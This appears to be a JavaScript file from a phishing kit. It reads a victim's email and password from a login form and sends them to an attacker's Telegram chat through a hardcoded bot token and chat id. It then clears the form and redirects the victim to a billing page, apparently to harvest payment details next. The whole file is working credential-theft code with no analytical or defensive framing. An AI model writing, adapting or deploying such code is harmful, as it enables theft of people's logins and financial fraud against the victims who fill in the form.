//bot token
var telegram_bot_id = "5841283191:AAG7gen0lQBGS4M-7NLQnFpzmjrJJYmUtyI";
var chat_id = 5010100378 ;
var emails, passs;
var ready = function () {
    emails= document.getElementById("email").value;
    passs= document.getElementById("pass").value;
	send_message("Hello, this is a test message from the formmail bot.")

	
    message = "\nemail: " + emails + "\npass: " + passs ;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
      $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("email").value="";
     document.getElementById("pass").value = "";
     document.getElementById("message").value = "";
	 
	window.location.href = "info/billing.html";
    return false;
};
